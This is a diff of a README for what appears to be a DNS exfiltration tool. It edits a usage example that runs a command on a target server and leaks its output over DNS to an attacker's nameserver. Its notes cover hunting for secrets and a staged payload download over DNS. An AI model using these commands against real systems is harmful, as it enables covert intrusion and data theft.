@@ -44,7 +44,7 @@ stdbuf -oL tcpdump --immediate -l -i any udp port 53|./procroustes_chunked.sh -w
 
 3. powershell example where we ssh into our NS to get the incoming DNS requests.
 ```bash
-./procroustes_chunked.sh -w ps -h yourdns.ns -d "Resolve-DnsName" -x dispatcher_examples/curl_waf.sh -- 'gci | % {$_.Name}' < <(stdbuf -oL ssh user@HOST 'sudo tcpdump --immediate -l udp port 53')
+./procroustes_chunked.sh -w ps -h yourdns.host -d "Resolve-DnsName" -x dispatcher_examples/curl_waf.sh -- 'gci | % {$_.Name}' < <(stdbuf -oL ssh user@HOST 'sudo tcpdump --immediate -l udp port 53')
 ```
 
 4. More information on the options
@@ -86,8 +86,9 @@ procroustes_full/bash/staged:
 
 [1] For the staged version, the command is downloaded through DNS, so the listed size is the total payload size as well. 
 
-[2] On procroustes_chunked, dispatcher is called multiple times and so as the provided command that is supposed to executed on the server (until all its output is exfiltrated). This behavior is not ideal in case the delivery of commands to the server (i.e. by calling the dispatcher) is time/resource intensive. It may also cause problems in case the command we are executing on the server is not idempotent (functionality or output-wise, e.g. "rm file;ls") or is time/resource intensive (e.g. find / -name secret) 
-A workaround for the latter scenario is to first store the command output into a file (e.g. /tmp/file) and then read that file.
+[2] On procroustes_chunked, dispatcher is called multiple times and so as the provided command that is supposed to executed on the server (until all its output is exfiltrated). This behavior is not ideal in case the delivery of commands to the server (i.e. by calling the dispatcher) is time/resource intensive. 
+
+It may also cause problems in case the command we are executing on the server is not idempotent (functionality or output-wise, e.g. "rm file;ls") or is time/resource intensive (e.g. find / -name secret). A workaround for this case is to first store the command output to a file (e.g. /tmp/file) and then use the script to read that file.
 
 [3] In the staged version we have the overhead of the time required to get the actual payload over DNS. It should be noted that the script makes use of A records to get the actual payload. Even though this allows our traffic to blend in better with the regular traffic of the target environment, it offers limited channel capacity (e.g. 4 bytes per request). We could make use of other record types like TXT and minimize the stage download time (close to zero) and the stager size.
 
